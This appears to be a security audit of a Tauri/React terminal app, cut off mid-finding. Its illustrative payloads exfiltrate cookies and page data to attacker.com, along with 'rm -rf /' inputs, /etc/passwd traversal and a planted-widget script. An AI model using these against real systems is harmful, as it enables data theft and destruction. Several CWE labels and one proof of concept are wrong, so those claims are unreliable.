# Security Audit Report: Hybrid Terminal Application
**Date:** December 6, 2025
**Application:** Infinitty (Tauri/React Hybrid Terminal)
**Audit Scope:** Comprehensive security review of Tauri backend, React frontend, MCP clients, widget system, and WebView integration

---

## Executive Summary

The Infinitty hybrid terminal application has **9 CRITICAL to HIGH severity vulnerabilities** requiring immediate remediation and **12 MEDIUM severity issues** that should be addressed in the near term. The most critical issues center on:

1. **Unsafe Git Command Execution** - User inputs passed directly to git commands without sanitization
2. **Unprotected Credential Storage** - API keys and tokens stored in plaintext in default configurations
3. **XSS Vulnerabilities** - User-controlled HTML rendered without proper sanitization
4. **Widget Sandbox Escape** - Process-based widgets run with unrestricted capabilities
5. **Command Injection in MCP** - User-provided arguments executed without validation

**Risk Level: HIGH** - This application handles file operations, shell commands, and external integrations with insufficient input validation and security controls.

---

## Findings by Severity

### CRITICAL Severity (4 Issues)

#### 1. Command Injection in Git Operations
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src-tauri/src/lib.rs`
**Lines:** 316-379 (git_stage_file, git_unstage_file, git_commit, git_checkout_branch)
**Severity:** CRITICAL
**CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection)

**Vulnerability Description:**
User-controlled inputs (`file`, `message`, `branch`) are passed directly to git commands through the `args` parameter without any validation or sanitization. While Rust's `Command` API uses argument arrays (which prevents shell metacharacter injection), the inputs are still executed with user-controlled values.

**Code Examples:**
```rust
// Line 319 - git_stage_file
Command::new("git")
    .args(["add", &file])  // ← 'file' parameter is user-controlled, no validation
    .current_dir(&path)
    .output()

// Line 341 - git_commit
Command::new("git")
    .args(["commit", "-m", &message])  // ← 'message' parameter is user-controlled
    .current_dir(&path)

// Line 371 - git_checkout_branch
Command::new("git")
    .args(["checkout", &branch])  // ← 'branch' parameter is user-controlled
    .current_dir(&path)
```

**Attack Vector:**
1. User provides malicious file path: `../../sensitive_file` or `$(malicious_command)`
2. User provides commit message with special characters or multiple commands
3. User provides branch name with path traversal or special characters
4. While `Command::args()` prevents shell injection, path traversal and symbolic link attacks are still possible

**Proof of Concept:**
```
1. User provides file path: "../../../../etc/passwd"
2. Command executes: git add ../../../../etc/passwd
3. If git has permissions, sensitive files could be staged/committed
4. Branch checkout with: "origin/$(rm -rf /)" attempts malicious operation
```

**Impact:**
- **Information Disclosure:** Attackers can stage/commit arbitrary files outside the repository
- **Data Manipulation:** Malicious branch names could access unintended refs
- **Path Traversal:** Access to files outside current directory

**Remediation:**
```rust
// Implement input validation for git operations
fn validate_git_filepath(path: &str) -> Result<(), String> {
    // Reject absolute paths
    if path.starts_with('/') {
        return Err("Absolute paths not allowed".to_string());
    }
    // Reject path traversal attempts
    if path.contains("..") {
        return Err("Path traversal detected".to_string());
    }
    // Reject suspicious patterns
    if path.contains('$') || path.contains('`') || path.contains(';') {
        return Err("Invalid characters in path".to_string());
    }
    Ok(())
}

fn validate_git_branch(branch: &str) -> Result<(), String> {
    // Use git branch naming rules: no spaces, no special chars except / - .
    if !branch.chars().all(|c| c.is_alphanumeric() || "-_./ ".contains(c)) {
        return Err("Invalid branch name characters".to_string());
    }
    if branch.contains("..") {
        return Err("Path traversal in branch name".to_string());
    }
    Ok(())
}

// Apply in git commands
#[tauri::command]
async fn git_checkout_branch(path: String, branch: String) -> Result<(), String> {
    validate_git_filepath(&path)?;
    validate_git_branch(&branch)?;
    // ... rest of implementation
}
```

---

#### 2. Plaintext Storage of Sensitive Credentials
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/types/mcp.ts`
**Lines:** 65-117 (DEFAULT_MCP_SERVERS)
**Severity:** CRITICAL
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Vulnerability Description:**
The application provides default MCP server configurations with placeholder fields for API keys and tokens stored in plaintext in environment variable defaults:

```typescript
// Line 82 - GitHub Personal Access Token
env: { GITHUB_PERSONAL_ACCESS_TOKEN: '' },

// Line 89 - Brave Search API Key
env: { BRAVE_API_KEY: '' },

// Line 102 - PostgreSQL Connection String
env: { POSTGRES_CONNECTION_STRING: '' },
```

Additionally, the MCPPanel component (visible in UI) shows environment variable input as plaintext textarea, suggesting users could enter credentials here.

**Attack Vector:**
1. Credentials stored in plaintext in MCP server configs
2. If localStorage/sessionStorage used, credentials are exposed to XSS
3. Process environment variables are readable by same-user processes
4. Git command output may leak credentials in error messages

**Evidence of Exposure Risk:**
- Widget SDK stores secrets in localStorage: `/src/widget-host/WidgetHost.tsx` lines 197-208
- Element selector exposes attributes (may contain tokens): `/src/hooks/useElementSelector.ts` lines 141-144

**Impact:**
- **Authentication Bypass:** GitHub/Brave/Database credentials exposed
- **Privilege Escalation:** Attacker gains credentials for external services
- **Data Breach:** Direct access to user's APIs and databases

**Remediation:**
```typescript
// NEVER store credentials in default configs
// Instead, require explicit user configuration only

// Use platform-specific secure storage
interface MCPServerConfig {
  // ... existing fields
  credentialStorageMethod: 'system-keychain' | 'encrypted-file'
  credentialKey?: string  // Reference to keychain, not actual value
}

// For widgets, implement secure secrets API
interface SecretsStorage {
  // Read from secure storage, never plaintext
  get: async (key: string) => Promise<string | undefined>
  // Write using platform keychain/secure storage
  store: async (key: string, value: string) => Promise<void>
  // DELETE operation should securely wipe
  delete: async (key: string) => Promise<void>
}

// Widget implementation:
// ✓ Use secure storage for API keys
// ✗ Never store in localStorage
// ✗ Never log credentials
// ✗ Never pass in command args visible to process list
```

---

#### 3. Arbitrary JavaScript Execution in WebViews
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src-tauri/src/lib.rs`
**Lines:** 130-145 (execute_webview_script)
**Severity:** CRITICAL
**CWE:** CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

**Vulnerability Description:**
The `execute_webview_script` Tauri command accepts arbitrary JavaScript code and executes it in a webview with unrestricted capabilities:

```rust
#[tauri::command]
async fn execute_webview_script(
    app: tauri::AppHandle,
    webview_id: String,
    script: String,  // ← User-provided JavaScript code
) -> Result<String, String> {
    if let Some(webview) = app.get_webview(&webview_id) {
        let result = webview.eval(&script);  // ← Direct eval without sanitization
        match result {
            Ok(_) => Ok("executed".to_string()),
            Err(e) => Err(e.to_string()),
        }
    } else {
        Err("Webview not found".to_string())
    }
}
```

**Attack Vector:**
1. Element selector script injection: `/src/hooks/useElementSelector.ts` injects script directly via this command
2. No validation of script content
3. No Content Security Policy (CSP) enforcement at Tauri level for webview scripts
4. Webview has access to Tauri IPC bridge, allowing arbitrary backend calls

**Proof of Concept:**
```javascript
// Attacker injects via useElementSelector toggle:
const maliciousScript = `
// Steal cookies and send to attacker
fetch('http://attacker.com/steal?cookies=' +
  document.cookie);

// Execute any Tauri command
window.__TAURI_INVOKE('execute_webview_script', {
  script: 'navigator.credentials.get(...)'
});
`
```

**Impact:**
- **Complete Webview Compromise:** Full JavaScript execution in webview context
- **Tauri IPC Escape:** Can invoke backend Tauri commands
- **Data Theft:** Access to cookies, session storage, element context data
- **Persistent Compromise:** Can modify page content indefinitely

**Remediation:**
```rust
// 1. Remove arbitrary script execution or restrict to specific patterns
#[tauri::command]
async fn execute_webview_script(
    app: tauri::AppHandle,
    webview_id: String,
    script: String,
) -> Result<String, String> {
    // REJECT: Block dangerous patterns
    if script.contains("__TAURI") ||
       script.contains("eval(") ||
       script.contains("new Function(") ||
       script.contains("localStorage") ||
       script.contains("sessionStorage") {
        return Err("Script contains forbidden operations".to_string());
    }

    // Only allow safe, pre-approved scripts
    match script.as_str() {
        "toggle_element_selector" => {
            // Call pre-defined safe function instead
            run_element_selector_safe(&app, &webview_id)?;
            Ok("executed".to_string())
        }
        _ => Err("Unknown script".to_string())
    }
}

// 2. Better: Move script logic to Rust backend
fn run_element_selector_safe(app: &AppHandle, webview_id: &str) -> Result<()> {
    // Pre-compiled, safe script constant
    const SELECTOR_SCRIPT: &str = include_str!("selector.js");
    if let Some(webview) = app.get_webview(webview_id) {
        webview.eval(SELECTOR_SCRIPT)?;
    }
    Ok(())
}

// 3. Enforce CSP for all webviews
// In tauri.conf.json, strengthen CSP:
"csp": "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https:;"
```

---

#### 4. Unvalidated URL Loading in WebViews
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/components/WebViewPane.tsx`
**Lines:** 185-207 (handleNavigate function)
**Severity:** CRITICAL
**CWE:** CWE-601 (URL Redirection to Untrusted Site)

**Vulnerability Description:**
The WebView component accepts user-provided URLs and loads them directly. While basic validation exists (lines 115-120), the validation is incomplete:

```typescript
// Line 192-206
const looksLikeUrl = /^(https?:\/\/)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(\/.*)?$/.test(trimmed) ||
                     trimmed.startsWith('http://') ||
                     trimmed.startsWith('https://') ||
                     trimmed.includes('localhost')

if (looksLikeUrl) {
    if (!trimmed.startsWith('http://') && !trimmed.startsWith('https://')) {
        normalizedUrl = 'https://' + trimmed  // ← Appends https:// without validating
    } else {
        normalizedUrl = trimmed
    }
}
// Line 215
await invoke('navigate_webview', {
    webviewId: webviewId.current,
    url: normalizedUrl,  // ← No further validation in Rust backend
})
```

**Attack Vector:**
1. **Protocol Confusion:** User can load `file://`, `data://`, or `javascript://` URLs
2. **Homograph Attacks:** Visual lookalike domains (e.g., `αpple.com` vs `apple.com`)
3. **No Allowlist:** Any valid URL loads, including internal network addresses
4. **Data URL Injection:** `data:text/html,<script>alert('xss')</script>`

**Proof of Concept:**
```
User inputs: javascript:alert('XSS');void(0);
After regex: Passes validation (includes ://)
Executed: javascript: protocol runs arbitrary code
```

**Impact:**
- **Arbitrary Code Execution:** JavaScript protocol execution
- **Data Exfiltration:** `file://` URLs access local filesystem
- **Social Engineering:** Attacker loads malicious sites via app

**Remediation:**
```typescript
function validateWebViewUrl(url: string): Result<string, string> {
  try {
    const parsed = new URL(url);

    // REJECT: Only allow http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return Err(`Protocol not allowed: ${parsed.protocol}`);
    }

    // REJECT: Block localhost/127.0.0.1 unless explicitly enabled
    const hostname = parsed.hostname;
    if (['localhost', '127.0.0.1', '::1'].includes(hostname) && !allowInternal) {
      return Err('Local addresses not allowed');
    }

    // REJECT: Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
    if (isPrivateIP(hostname)) {
      return Err('Private IP addresses not allowed');
    }

    return Ok(parsed.toString());
  } catch (e) {
    return Err(`Invalid URL: ${e.message}`);
  }
}

// Use in handleNavigate:
const result = validateWebViewUrl(normalizedUrl);
if (!result.ok) {
  setError(result.error);
  return;
}
await invoke('navigate_webview', {
  webviewId: webviewId.current,
  url: result.value,
});
```

---

### HIGH Severity (5 Issues)

#### 5. XSS via dangerouslySetInnerHTML Without Input Sanitization
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/components/EditorPane.tsx`
**Lines:** 510, 547
**Severity:** HIGH
**CWE:** CWE-79 (Cross-site Scripting)

**Vulnerability Description:**
The EditorPane renders markdown and code with `dangerouslySetInnerHTML` without proper sanitization:

```tsx
// Line 510 - Markdown preview
dangerouslySetInnerHTML={{ __html: renderedMarkdown }}

// Line 547 - Code highlight
dangerouslySetInnerHTML={{ __html: highlightedCode }}
```

**Issue:** If `renderedMarkdown` or `highlightedCode` come from user-controlled sources (file content, MCP resources, element context), XSS is possible.

**Attack Vector:**
1. User opens markdown file with embedded HTML: `<img src=x onerror="fetch('http://attacker.com/steal?data='+btoa(document.body.innerHTML))">`
2. Syntax highlighting includes event handlers from user input
3. Element selector context displays raw HTML attributes

**Impact:**
- **Session Hijacking:** Steal authentication tokens
- **Data Exfiltration:** Access clipboard, file contents
- **Malware Distribution:** Execute arbitrary code

**Remediation:**
```tsx
import DOMPurify from 'dompurify';

// For markdown
const sanitizedHtml = DOMPurify.sanitize(renderedMarkdown, {
  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'code', 'pre', 'ul', 'ol', 'li', 'strong', 'em'],
  ALLOWED_ATTR: ['href', 'target'],
  KEEP_CONTENT: true,
});

dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
```

---

#### 6. Widget Process Runs with Unrestricted Capabilities
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/widget-host/WidgetProcessManager.ts`
**Lines:** 68-74 (startWidget)
**Severity:** HIGH
**CWE:** CWE-648 (Incorrect Parenthesization), CWE-250 (Execution with Unnecessary Privileges)

**Vulnerability Description:**
External widget processes are spawned with environment variables passed through directly without validation:

```typescript
// Line 68-74
const command = Command.create('node', [entryPoint, port.toString()], {
  cwd: widgetPath,
  env: {  // ← All environment variables passed to widget process
    PORT: port.toString(),
    WIDGET_ID: widgetId,
  },
})
```

**Issues:**
1. Widget process can access sensitive environment variables
2. No resource limits (memory, CPU, file access)
3. No sandboxing or process isolation
4. Widget can read/write to entire home directory
5. Process discovery reveals widget structure: `ps aux | grep node`

**Attack Vector:**
1. Malicious widget installation reads environment variables for API keys
2. Widget forks additional processes (crypto mining, botnet)
3. Widget exfiltrates user data through HTTP
4. Widget modifies system files in home directory

**Impact:**
- **Privilege Escalation:** Widgets run with full user privileges
- **Lateral Movement:** Can launch other attacks
- **Resource Exhaustion:** DoS through CPU/memory exhaustion
- **Data Theft:** Direct filesystem access

**Remediation:**
```typescript
// 1. Implement widget sandbox restrictions
interface WidgetSandboxConfig {
  cpuLimit: number        // CPU cores available
  memoryLimit: number     // MB available
  diskQuota: number       // MB writable
  networkAllowed: boolean // Whitelist for network
  fsWhitelist: string[]   // Allowed directories
}

// 2. Create isolated environment
const createIsolatedEnv = (widgetId: string): Record<string, string> => {
  return {
    // Only set required variables
    PORT: port.toString(),
    WIDGET_ID: widgetId,
    // Remove sensitive variables
    // Do NOT include: HOME, USER, SHELL, PATH (partially), etc.
    PATH: '/usr/bin:/bin',  // Restricted PATH
    // Isolate home directory
    HOME: `/tmp/widget-${widgetId}`,
  };
};

// 3. Run with resource limits (Unix only)
const command = Command.create('node', [entryPoint, port.toString()], {
  cwd: widgetPath,
  env: createIsolatedEnv(widgetId),
});

// 4. Use container/VM for complete isolation (future improvement)
// Consider: Docker, Firecracker, or native OS sandboxing
```

---

#### 7. MCP Tool Execution Without Input Validation
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/services/mcpClient.ts`
**Lines:** 196-202 (callTool)
**Severity:** HIGH
**CWE:** CWE-94 (Code Injection)

**Vulnerability Description:**
The MCP client passes user-provided tool arguments directly to external MCP servers without validation:

```typescript
// Line 196-202
async callTool(name: string, args: Record<string, unknown>): Promise<unknown> {
    const result = await this.sendRequest<{ content: unknown[] }>('tools/call', {
        name,
        arguments: args,  // ← Arbitrary arguments passed without validation
    })
    return result.content
}
```

**Attack Vector:**
1. User calls `git` MCP tool with malicious arguments: `{command: "rm -rf /", cwd: "/"}`
2. User calls file system tool with path traversal: `{path: "../../../../etc/passwd"}`
3. User calls shell tool with command injection: `{cmd: "echo test; malicious_command"}`

**Impact:**
- **Arbitrary Command Execution:** Via MCP tools
- **Data Destruction:** Malicious file operations
- **Credential Theft:** Access sensitive files

**Remediation:**
```typescript
interface ToolInputSchema {
  type: 'object'
  properties: Record<string, {
    type: string
    pattern?: string
    minLength?: number
    maxLength?: number
    enum?: unknown[]
  }>
  required: string[]
}

async callTool(
  name: string,
  args: Record<string, unknown>,
  schema?: ToolInputSchema
): Promise<unknown> {
  // 1. Validate against schema
  if (schema) {
    const validation = validateAgainstSchema(args, schema);
    if (!validation.valid) {
      throw new Error(`Invalid tool arguments: ${validation.errors.join(', ')}`);
    }
  }

  // 2. Sanitize specific tool types
  if (this.isFileSystemTool(name)) {
    args = this.sanitizeFileSystemArgs(args);
  } else if (this.isCommandTool(name)) {
    args = this.sanitizeCommandArgs(args);
  }

  const result = await this.sendRequest<{ content: unknown[] }>('tools/call', {
    name,
    arguments: args,
  });
  return result.content;
}
```

---

#### 8. Widget Storage Uses Insecure localStorage
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/widget-host/WidgetHost.tsx`
**Lines:** 165-208 (createStorage, secrets)
**Severity:** HIGH
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Vulnerability Description:**
Widget SDK stores secrets and configuration in plaintext localStorage:

```typescript
// Line 197-208 - Secrets storage in localStorage
const secrets: SecretsStorage = {
  get: async (key) => {
    const stored = localStorage.getItem(`widget:${widgetType}:secrets:${key}`)
    return stored ?? undefined
  },
  store: async (key, value) => {
    localStorage.setItem(`widget:${widgetType}:secrets:${key}`, value)  // ← Plaintext!
  },
  delete: async (key) => {
    localStorage.removeItem(`widget:${widgetType}:secrets:${key}`)
  },
}

// Line 171-188 - Storage in localStorage
const cache = new Map<string, unknown>()
try {
  const stored = localStorage.getItem(storageKey)
  if (stored) {
    const data = JSON.parse(stored)
    Object.entries(data).forEach(([k, v]) => cache.set(k, v))
  }
} catch {}
```

**Issues:**
1. Secrets stored in plaintext in localStorage
2. XSS vulnerability exposes all stored secrets
3. localStorage persists across sessions
4. No encryption or access control
5. Browser DevTools reveal all secrets

**Attack Vector:**
1. XSS in any page loads widget secrets
2. Malicious extension reads localStorage
3. Physical device access reveals secrets
4. Browser profile theft exposes all credentials

**Impact:**
- **Credential Exposure:** API keys, tokens in plaintext
- **Privilege Escalation:** Use stolen credentials for external services
- **Persistent Compromise:** Data survives application restart

**Remediation:**
```typescript
// 1. Use Tauri's secure storage for sensitive data
import { invoke } from '@tauri-apps/api/core';

const secrets: SecretsStorage = {
  get: async (key) => {
    try {
      return await invoke('secret_get', {
        widget_id: widgetId,
        key
      });
    } catch {
      return undefined;
    }
  },
  store: async (key, value) => {
    await invoke('secret_store', {
      widget_id: widgetId,
      key,
      value
    });
  },
  delete: async (key) => {
    await invoke('secret_delete', {
      widget_id: widgetId,
      key
    });
  },
};

// 2. Implement Rust backend for secure storage
#[tauri::command]
fn secret_store(widget_id: String, key: String, value: String) -> Result<(), String> {
  // Use platform-specific secure storage:
  // macOS: Keychain
  // Windows: DPAPI
  // Linux: Secret Service / Pass

  #[cfg(target_os = "macos")]
  {
    use security_framework::passwords::SecPassword;
    // Store using Keychain
  }
}

// 3. Regular storage (non-sensitive) can use sessionStorage
const storage: WidgetStorage = {
  get: (key, defaultValue) => {
    const stored = sessionStorage.getItem(`widget:${widgetId}:${key}`);
    return stored ? JSON.parse(stored) : defaultValue;
  },
  set: async (key, value) => {
    sessionStorage.setItem(`widget:${widgetId}:${key}`, JSON.stringify(value));
  },
  // ... rest
};
```

---

### MEDIUM Severity (7 Issues)

#### 9. File System Operations Without Path Validation
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src-tauri/src/lib.rs`
**Lines:** 384-410 (fs_create_file, fs_create_directory, fs_rename, fs_delete, fs_copy, fs_move)
**Severity:** MEDIUM
**CWE:** CWE-22 (Path Traversal)

**Vulnerability Description:**
File system operations accept user-provided paths without validation:

```rust
#[tauri::command]
async fn fs_create_file(path: String) -> Result<(), String> {
    use std::fs::File;
    File::create(&path).map_err(|e| e.to_string())?;  // ← No path validation
    Ok(())
}

#[tauri::command]
async fn fs_delete(path: String, is_directory: bool) -> Result<(), String> {
    if is_directory {
        std::fs::remove_dir_all(&path)...  // ← Recursive delete without checks
    } else {
        std::fs::remove_file(&path)...
    }
    Ok(())
}
```

**Attack Vector:**
1. Create files outside intended directory: `../../sensitive.txt`
2. Delete arbitrary directories: `../../important_directory`
3. Symlink attacks: Create symlinks pointing to system files
4. Race conditions: Create/delete between checks

**Impact:**
- **Data Destruction:** Delete arbitrary files/directories
- **Privilege Escalation:** Overwrite system configuration if running elevated
- **Information Disclosure:** Access files outside intended scope

**Remediation:**
```rust
fn validate_safe_path(base: &str, requested: &str) -> Result<String, String> {
    use std::path::{Path, PathBuf};
    use std::fs;

    let base_path = Path::new(base).canonicalize()
        .map_err(|e| format!("Invalid base path: {}", e))?;

    // If absolute path provided, reject
    if Path::new(requested).is_absolute() {
        return Err("Absolute paths not allowed".to_string());
    }

    // Resolve relative path
    let requested_path = base_path.join(requested);
    let canonical = requested_path.canonicalize()
        .map_err(|e| format!("Path resolution failed: {}", e))?;

    // Ensure result is within base path
    if !canonical.starts_with(&base_path) {
        return Err("Path traversal detected".to_string());
    }

    Ok(canonical.to_string_lossy().to_string())
}

#[tauri::command]
async fn fs_delete(path: String, is_directory: bool) -> Result<(), String> {
    // Validate against home directory as base
    let home = std::env::var("HOME").map_err(|_| "No HOME set")?;
    let safe_path = validate_safe_path(&home, &path)?;

    if is_directory {
        std::fs::remove_dir_all(&safe_path).map_err(|e| e.to_string())?;
    } else {
        std::fs::remove_file(&safe_path).map_err(|e| e.to_string())?;
    }
    Ok(())
}
```

---

#### 10. Unvalidated Environment Variable Exposure in MCP Configs
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/types/mcp.ts`
**Lines:** 65-117
**Severity:** MEDIUM
**CWE:** CWE-15 (Improper Restriction of Rendered UI Layers or Frames)

**Vulnerability Description:**
Default MCP server configurations expose template environment variables with empty credentials. Users see placeholder configurations suggesting where to put credentials.

```typescript
{
  name: 'GitHub',
  command: 'npx',
  args: ['-y', '@modelcontextprotocol/server-github'],
  env: { GITHUB_PERSONAL_ACCESS_TOKEN: '' },  // ← Template showing credential location
  enabled: false,
}
```

**Issue:** Users may fill these with actual credentials, then:
1. Credentials end up in plaintext MCP config
2. Config file may be committed to version control
3. Config file is readable by other processes
4. Electron/Tauri config files often world-readable

**Attack Vector:**
1. Source code inspection reveals default configs with credential templates
2. User mistakenly fills in real credentials in UI
3. Application stores config with plaintext credentials
4. Config file accessed via:
   - Version control history
   - Backup systems
   - File system access
   - Process environment inspection

**Impact:**
- **Information Disclosure:** Exposed API keys and tokens
- **Unauthorized Access:** Attacker uses credentials for external APIs
- **Data Breach:** Access to user's GitHub, databases, search APIs

**Remediation:**
```typescript
// 1. Remove credential placeholders from default configs
export const DEFAULT_MCP_SERVERS: Omit<MCPServerConfig, 'id'>[] = [
  {
    name: 'GitHub',
    command: 'npx',
    args: ['-y', '@modelcontextprotocol/server-github'],
    // REMOVED: env: { GITHUB_PERSONAL_ACCESS_TOKEN: '' }
    enabled: false,
  },
  // ...
];

// 2. Provide secure configuration flow
interface ConfigureGitHubProps {
  onComplete: (token: string) => void;
}

export function ConfigureGitHubServer({ onComplete }: ConfigureGitHubProps) {
  const [token, setToken] = useState('');

  const handleSave = async () => {
    // Store using secure storage (Keychain/DPAPI/Secret Service)
    await invoke('secure_store_credential', {
      service: 'mcp:github',
      credential: token,
    });
    onComplete(token);
  };

  return (
    <div>
      <label>GitHub Personal Access Token</label>
      <PasswordInput
        value={token}
        onChange={setToken}
        placeholder="ghp_xxxxxxxxxxxxx"
      />
      <button onClick={handleSave}>Save to Secure Storage</button>
    </div>
  );
}
```

---

#### 11. Content Security Policy Too Permissive
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src-tauri/tauri.conf.json`
**Lines:** 28
**Severity:** MEDIUM
**CWE:** CWE-693 (Protection Mechanism Failure)

**Vulnerability Description:**
The CSP header is too permissive:

```json
"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: blob: asset: https:; font-src 'self' data: https://fonts.gstatic.com; connect-src 'self' https:; worker-src 'self' blob:"
```

**Issues:**
1. `style-src 'unsafe-inline'` - Allows inline style injection for CSS-based XSS
2. `img-src https:` - Allows loading images from ANY https domain (could trigger fetch on specific domains)
3. `connect-src 'self' https:` - Allows connecting to ANY https domain (exfiltration vector)
4. `worker-src 'self' blob:` - Blob: allows loading worker code from dynamic sources

**Attack Vector:**
1. XSS via inline styles: `<div style="background: url('javascript:alert(1)')"></div>`
2. Exfiltration via image tags: `<img src="https://attacker.com/?data=encoded_secrets">`
3. WebSocket to external server: `new WebSocket('wss://attacker.com')`

**Impact:**
- **Information Exfiltration:** Data sent to external domains
- **XSS Enhancement:** More vectors for style-based attacks
- **Credential Theft:** Easier to exfiltrate stored credentials

**Remediation:**
```json
{
  "security": {
    "csp": "default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: blob: asset:; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; worker-src 'self'; frame-src 'self';"
  }
}
```

**Changes:**
- `default-src 'none'` - Deny everything by default
- Removed `https:` from `img-src` and `connect-src` - Only self
- Removed `'unsafe-inline'` from style-src - Use external stylesheets only
- Added `frame-src 'self'` - Control iframe sources

---

#### 12. Widget Discovery Allows Loading from User-Writable Directories
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/widget-host/WidgetDiscovery.ts`
**Lines:** 122-128 (discoverWidgets)
**Severity:** MEDIUM
**CWE:** CWE-426 (Untrusted Search Path)

**Vulnerability Description:**
Widget discovery scans user-controlled directories for widgets:

```typescript
// Line 122-128
try {
  const userWidgetsPath = await join(await appDataDir(), 'widgets')
  const userWidgets = await this.scanDirectory(userWidgetsPath, 'user')
  widgets.push(...userWidgets)
} catch (err) {
  console.warn('[WidgetDiscovery] Failed to scan user widgets:', err)
}
```

**Issue:** User can place malicious widget manifests in their app data directory. The widget is then discovered and run automatically.

**Attack Vector:**
1. Attacker writes malicious widget to `~/.local/share/infinitty/widgets/` (Linux)
2. Attacker writes to `~/Library/Application Support/infinitty/widgets/` (macOS)
3. On app startup, widget is discovered and auto-started
4. Malicious widget runs with user privileges

**Proof of Concept:**
```bash
# Attacker places malicious widget manifest
mkdir -p ~/.local/share/infinitty/widgets/com.attacker.evil
cat > ~/.local/share/infinitty/widgets/com.attacker.evil/manifest.json <<EOF
{
  "id": "com.attacker.evil",
  "name": "Evil Widget",
  "version": "1.0.0",
  "main": "dist/index.js",
  "executionModel": "process"
}
EOF

# Create malicious JavaScript that exfiltrates data
# On next app startup, widget auto-loads and runs
```

**Impact:**
- **Arbitrary Code Execution:** Malicious widget runs on startup
- **Privilege Escalation:** Runs with user privileges
- **Persistent Compromise:** Survives app restart

**Remediation:**
```typescript
// 1. Verify widget signatures
async discoverWidgets(forceRefresh = false): Promise<DiscoveredWidget[]> {
  const widgets: DiscoveredWidget[] = [];

  // 1a. Only load built-in (bundled) widgets automatically
  try {
    const builtinWidgets = await this.scanDirectory('src/widgets-external', 'builtin');
    widgets.push(...builtinWidgets);
  } catch (err) {
    console.warn('[WidgetDiscovery] Failed to scan builtin widgets:', err);
  }

  // 1b. For user widgets, require explicit enablement
  // Don't auto-discover from user directory
  const enabledUserWidgets = await this.loadEnabledUserWidgets();
  widgets.push(...enabledUserWidgets);

  return widgets;
}

// 2. Implement widget signing
interface SignedWidgetManifest extends WidgetManifest {
  signature?: string;  // HMAC-SHA256 of manifest
  publicKey?: string;
}

async verifyWidgetSignature(manifest: SignedWidgetManifest): Promise<boolean> {
  if (!manifest.signature || !manifest.publicKey) {
    // Unsigned widgets require explicit user approval
    return await this.promptUserApproval(manifest);
  }

  // Verify signature against public key
  return await this.verifyHMAC(manifest, manifest.signature, manifest.publicKey);
}

// 3. Implement allowlist for user widgets
async loadEnabledUserWidgets(): Promise<DiscoveredWidget[]> {
  // Read from user's approved widget list
  const allowedWidgets = await this.readAllowedWidgetList();
  const widgets: DiscoveredWidget[] = [];

  for (const widgetId of allowedWidgets) {
    try {
      const widget = await this.loadWidget(widgetId);
      if (await this.verifyWidgetSignature(widget.manifest)) {
        widgets.push(widget);
      }
    } catch (err) {
      console.warn(`[WidgetDiscovery] Failed to load allowed widget: ${widgetId}`, err);
    }
  }

  return widgets;
}
```

---

#### 13. Cross-Origin WebView Communication Without Origin Validation
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/hooks/useElementSelector.ts`
**Lines:** 169-172 (postMessage)
**Severity:** MEDIUM
**CWE:** CWE-942 (Permissive Cross-domain Policy)

**Vulnerability Description:**
Element selector sends data via postMessage with wildcard origin:

```typescript
// Line 169-172
window.postMessage({
    type: '__INFINITTY_ELEMENT_SELECTED',
    context: context,
}, '*');  // ← Wildcard origin allows ANY frame to receive this
```

**Issue:** Any frame (including attacker-controlled iframes) can listen to and intercept this message.

**Attack Vector:**
1. Attacker embeds iframe in webview pointing to attacker domain
2. Attacker's iframe listens to postMessage events
3. When user selects element, attacker's iframe receives the element context (HTML, attributes, etc.)
4. Attacker exfiltrates sensitive data from selected elements

**Impact:**
- **Data Exfiltration:** Attacker captures selected element context
- **Clipboard Data Theft:** Element context may contain sensitive information
- **Session Hijacking:** If element context includes tokens

**Remediation:**
```typescript
// 1. Use specific origin instead of wildcard
window.postMessage({
    type: '__INFINITTY_ELEMENT_SELECTED',
    context: context,
}, window.location.origin);  // ← Only same origin

// 2. Better: Use secure channel to parent window
if (window !== window.parent) {
  // In iframe context - use parent communication
  window.parent.postMessage({
    type: '__INFINITTY_ELEMENT_SELECTED',
    context: context,
  }, window.parent.location.origin);
} else {
  // In main window - use local event or Tauri
  invoke('element_selected', { context });
}

// 3. On receiver side - validate origin
const handleMessage = (event: MessageEvent) => {
  // Validate origin
  if (event.origin !== window.location.origin) {
    console.warn('Rejecting message from untrusted origin', event.origin);
    return;
  }

  if (event.data?.type === '__INFINITTY_ELEMENT_SELECTED') {
    const context = event.data.context as ElementContext;
    copyContextToClipboard(context);
  }
};
window.addEventListener('message', handleMessage);
```

---

#### 14. Process Environment Variables Exposed in Widget Process
**File:** `/Users/jkneen/Documents/GitHub/flows/hybrid-terminal/src/widget-host/WidgetProcessManager.ts`
**Lines:** 70-74
**Severity:** MEDIUM
**CWE:** CWE-200 (Information Exposure)

**Vulnerability Description:**
Widget processes are spawned with environment variables that may contain sensitive data:

```typescript
// Line 70-74
